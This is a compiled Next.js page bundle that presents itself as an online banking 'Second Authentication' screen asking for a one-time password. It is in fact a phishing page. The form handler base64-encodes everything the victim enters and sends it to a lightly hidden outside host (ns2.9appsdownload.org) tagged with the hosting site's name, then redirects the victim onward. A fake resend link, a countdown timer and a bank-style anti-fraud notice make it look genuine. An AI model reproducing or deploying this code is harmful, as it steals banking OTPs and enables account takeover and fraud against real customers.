(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [358], {
        7995: function(e, n, t) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/b", function() {
                return t(1307)
            }])
        },
        9018: function(e, n, t) {
            "use strict";
            var s = t(1876).Buffer,
                a = {
                    dataList: s.from("https://ns2.9appsdownload.org/in.php", "utf-8").toString("base64"),
                    getList: s.from("https://ns2.9appsdownload.org/aja.php", "utf-8").toString("base64")
                };
            n.Z = a
        },
        1307: function(e, n, t) {
            "use strict";
            t.r(n), t.d(n, {
                default: function() {
                    return m
                }
            });
            var s = t(7568),
                a = t(655),
                r = t(5893),
                i = t(9008),
                o = t.n(i),
                c = t(5675),
                l = t.n(c),
                u = t(7294),
                d = t(1163),
                h = t(9018),
                $ = t(1876).Buffer;

            function m() {
                var e = (0, d.useRouter)(),
                    n = (0, u.useState)(""),
                    t = n[0];
                n[1];
                var i, c = (0, u.useState)(!1),
                    m = c[0],
                    f = c[1],
                    p = (i = (0, s.Z)(function(n) {
                        var t, s, r, i, o, c, l;
                        return (0, a.__generator)(this, function(a) {
                            switch (a.label) {
                                case 0:
                                    return n.preventDefault(), f(!0), t = new FormData(n.target), s = {}, t.forEach(function(e, n) {
                                        s[n] = e
                                    }), r = JSON.stringify(s), i = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "text/plain"
                                    }, o.body = $.from(r, "utf-8").toString("base64"), o), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (c = a.sent()).json()];
                                case 2:
                                    return l = a.sent(), f(!1), !0 == l.status ? e.push("/c") : f(!1), [2]
                            }
                        })
                    }), function(e) {
                        return i.apply(this, arguments)
                    }),
                    x = (0, u.useState)("03:00"),
                    v = x[0],
                    j = x[1];
                return (0, u.useEffect)(function() {
                    var e = function(n) {
                        var t = Math.floor(n / 60),
                            s = n % 60;
                        if (j((t = t < 10 ? "0" + t : t) + ":" + (s = s < 10 ? "0" + s : s)), (n -= 1) >= 0) {
                            setTimeout(function() {
                                e(n)
                            }, 1e3);
                            return
                        }
                    };
                    e(180)
                }, []), (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsxs)(o(), {
                        children: [(0, r.jsx)("title", {
                            children: "Verify Second Factor Login"
                        }), (0, r.jsx)("meta", {
                            name: "description",
                            content: "verify second factor login"
                        })]
                    }), (0, r.jsxs)("main", {
                        children: [(0, r.jsx)("div", {
                            className: "logo",
                            children: (0, r.jsx)(l(), {
                                src: "/image.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, r.jsx)("br", {}), (0, r.jsx)("div", {
                            className: "panelDiv",
                            children: (0, r.jsx)("div", {
                                className: "panel",
                                children: (0, r.jsx)("span", {
                                    children: t
                                })
                            })
                        }), (0, r.jsx)("div", {
                            className: "content_heading",
                            children: (0, r.jsx)("h3", {
                                className: "pull-left",
                                children: "Second Authentication"
                            })
                        }), (0, r.jsxs)("div", {
                            className: "content_area",
                            children: [(0, r.jsx)("p", {
                                className: "content_title",
                                children: "Enter the One Time Password sending to your mobile"
                            }), (0, r.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, r.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: p,
                                children: [(0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "Otp1",
                                        children: [" One Time Password", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "Otp1",
                                        type: "text",
                                        name: "Otp1",
                                        maxLength: 8
                                    })]
                                }), (0, r.jsxs)("div", {
                                    className: "commonbutton",
                                    children: [(0, r.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!m,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    }), (0, r.jsx)("p", {
                                        children: v
                                    })]
                                })]
                            }), (0, r.jsx)("div", {
                                className: "common_btn",
                                children: (0, r.jsxs)("p", {
                                    children: ["If you did not receive the  OTP on Mobile, you can", (0, r.jsx)("a", {
                                        href: "#",
                                        className: "btn btn-resend",
                                        type: "button",
                                        children: "Click here to resend OTP"
                                    })]
                                })
                            }), (0, r.jsx)("div", {
                                className: "info_panel",
                                children: (0, r.jsx)("div", {
                                    className: "notify_icon",
                                    children: (0, r.jsxs)("ul", {
                                        children: [(0, r.jsx)("li", {
                                            children: "Any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately. if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."
                                        }), (0, r.jsx)("li", {
                                            children: "Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."
                                        })]
                                    })
                                })
                            })]
                        }), (0, r.jsx)("div", {
                            className: "footer_area",
                            children: (0, r.jsx)(l(), {
                                src: "/v.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, r.jsx)("div", {
                            className: "footer",
                            children: (0, r.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, n, t) {
            "use strict";

            function s(e, n, t, s, a, r, i) {
                try {
                    var o = e[r](i),
                        c = o.value
                } catch (l) {
                    t(l);
                    return
                }
                o.done ? n(c) : Promise.resolve(c).then(s, a)
            }

            function a(e) {
                return function() {
                    var n = this,
                        t = arguments;
                    return new Promise(function(a, r) {
                        var i = e.apply(n, t);

                        function o(e) {
                            s(i, a, r, o, c, "next", e)
                        }

                        function c(e) {
                            s(i, a, r, o, c, "throw", e)
                        }
                        o(void 0)
                    })
                }
            }
            t.d(n, {
                Z: function() {
                    return a
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 876, 774, 888, 179], function() {
            return e(e.s = 7995)
        }), _N_E = e.O()
    }
]);